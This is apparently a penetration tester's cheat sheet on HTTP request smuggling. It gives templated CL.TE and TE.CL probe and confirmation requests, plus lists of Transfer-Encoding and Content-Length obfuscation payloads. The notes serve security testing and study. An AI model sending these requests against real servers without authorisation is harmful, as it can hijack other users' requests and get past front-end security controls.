# HTTP Smuggling
**Content-Length (body) is DECIMAL Bytes**
**Chunk size is HEX Bytes**
**Start smuggling by finding a POST request - Can include converting GET into POST / Finding Fat GET request (CDN)**

**Note: Always append two lines (`\r\n\r\n`) after Null chunk**
**Note: Each line (`\r\n`) is 2 bytes long**
**Note: Request does not care if method is on new lines :**
```
P
O
S
T / HTTP/1.1
```

## Headers
```
Transfer-Encoding: chunked
Connection: Keep-Alive
```
## CL.TE
**Client sends Incomplete chunks**
**Nicer to test this first**
```
POST / HTTP/1.1  
Host: vulnerable-website.com  
Transfer-Encoding: chunked  
Content-Length: 4  
  
1
A
[<SMUGGLE>]
```
- Incomplete chunk is sent - Server hangs expecting Zero Chunk

### Confirmation
```
POST /search HTTP/1.1  
Host: <HOST>
Content-Length: 49  
Transfer-Encoding: chunked  
  
<HEX LEN BODY>
<BODY>
0
  
GET /404 HTTP/1.1  
Foo: x
```

## TE.CL
**Client sends larger Content-Length than chunk**
```
POST / HTTP/1.1  
Host: <HOST>
Transfer-Encoding: chunked  
Content-Length: 6
  
0

[<SMUGGLE>]
```
-Zero chunk (3 bytes) is sent - Server hangs expecting 3 more bytes

### Confirmation
```POST /search HTTP/1.1  
Host: <HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: <2 + LENGTH HEX>
Transfer-Encoding: chunked

<HEX LENGTH OF BODY>
POST /404 HTTP/1.1
Host: <HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: <11 + LEN ENTIRE NEXT REQUEST>

x=
0


```
Or
```POST /search HTTP/1.1  
Host: <HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: <2 + LENGTH HEX>
Transfer-Encoding: chunked

<HEX LENGTH OF BODY>
POST /404 HTTP/1.1
Host: <HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: <11 + LEN ENTIRE NEXT REQUEST>
X-Ignore: X
0


```
May cause issues with duplicate headers

## TE.TE
**Obfuscating T.E Header hangs Client / Server**
**Try with above payloads to determine CL.TE or TE.CL**
### Obfuscating Payloads
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked`
- `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
- `Transfer-Encoding:[tab]chunked`
- `[space]Transfer-Encoding: chunked`
- `X: X[\n]Transfer-Encoding: chunked`
- `Transfer-Encoding
	: chunked`

## CL.CL
**Obfuscating Content-Length Header produces different response**
### Obfuscating Payloads
- `Content-Length : 0`
- `Content-Length abcd: 0`
- `Content_Length: 0`
- `[\r]Content-Length: 0`


